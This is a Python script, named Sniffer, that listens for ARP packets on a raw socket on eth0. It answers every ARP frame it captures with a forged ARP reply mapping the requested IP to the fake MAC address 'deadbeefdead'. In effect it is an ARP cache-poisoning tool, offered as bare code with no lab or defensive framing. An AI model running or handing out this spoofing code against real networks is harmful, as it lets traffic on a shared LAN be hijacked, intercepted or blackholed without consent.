import socket
import struct
import binascii
import time
import textwrap


class Sniffer:
    def __init__(self):
        self.sourceMac = ''
        self.sourceIP = ''
        self.destMac = ''
        self.destIp = ''
        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        self.sock.bind(('eth0', 0))
        self.read()

    def read(self):
        while True:
            packet = self.sock.recvfrom(2048)

            ethernet_header = packet[0][0:14]
            ethernet_detailed = struct.unpack("!6s6s2s", ethernet_header)

            arp_header = packet[0][14:42]
            arp_detailed = struct.unpack("2s2s1s1s2s6s4s6s4s", arp_header)

            if(binascii.hexlify(ethernet_detailed[2]) != b'0806'):
                continue

            print("****************_ETHERNET_FRAME_****************")
            print("Dest MAC:        ", binascii.hexlify(ethernet_detailed[0]))
            print("Source MAC:      ", binascii.hexlify(ethernet_detailed[1]))
            print("Type:            ", binascii.hexlify(ethernet_detailed[2]))
            print("************************************************")
            print("******************_ARP_HEADER_******************")
            print("Hardware type:   ", binascii.hexlify(arp_detailed[0]))
            print("Protocol type:   ", binascii.hexlify(arp_detailed[1]))
            print("Hardware size:   ", binascii.hexlify(arp_detailed[2]))
            print("Protocol size:   ", binascii.hexlify(arp_detailed[3]))
            print("Opcode:          ", binascii.hexlify(arp_detailed[4]))
            print("Source MAC:      ", binascii.hexlify(arp_detailed[5]))
            print("Source IP:       ", socket.inet_ntoa(arp_detailed[6]))
            print("Dest MAC:        ", binascii.hexlify(arp_detailed[7]))
            print("Dest IP:         ", socket.inet_ntoa(arp_detailed[8]))
            print("*************************************************\n")

            self.sourceMac = ethernet_detailed[1]
            self.sourceIP = arp_detailed[6]
            self.destMac = arp_detailed[7]
            self.destIp = arp_detailed[8]

            self.ARPreply()

    def ARPreply(self):
        nulls = [0x00 for i in range(0, 18)]
        ARP_FRAME = [
            struct.pack('!6B', *self.sourceMac),   # DESTINATION MAC ADDRESS
            struct.pack('!6B', *binascii.unhexlify(b'deadbeefdead')),  # SOURCE MAC ADDRESS
            struct.pack('!H', 0x0806),      # 0X0806 IS A ARP TYPE
            struct.pack('!H', 0x0001),      # 0X0001 IS A ETHERNET HW TYPE
            struct.pack('!H', 0x0800),      # 0X0800 IS A IPV4 PROTOCOL
            struct.pack('!B', 0x06),        # 0X06 HW SIZE (MAC)
            struct.pack('!B', 0x04),        # 0X04 PROTOCOL SIZE (IP)
            struct.pack('!H', 0x0002),      # 0x0002 IS A ARP REPLY
            struct.pack('!6B', *binascii.unhexlify(b'deadbeefdead')),   # SENDER MAC
            struct.pack('!4B', *self.destIp),    # SENDER IP
            struct.pack('!6B', *self.sourceMac),  # TARGET MAC
            struct.pack('!4B', *self.sourceIP),    # TARGET IP
            struct.pack('!18B', *nulls)
        ]

        print("_________ARP reply___________")
        print("DESTINATION MAC ADDRESS",self.sourceMac )
        print("SOURCE MAC ADDRESS   ", binascii.unhexlify(b'deadbeefdead'))
        print("SENDER MAC           ", binascii.unhexlify(b'deadbeefdead'))
        print("SENDER IP            ", struct.unpack('!4B', self.destIp))
        print("TARGET MAC           ", struct.unpack('!6B', self.sourceMac))
        print("TARGET IP            ", struct.unpack('!4B', self.sourceIP))
        print("_____________________________")
        time.sleep(0.001)
        self.sock.send(b''.join(ARP_FRAME))


if __name__ == "__main__":
    snif = Sniffer()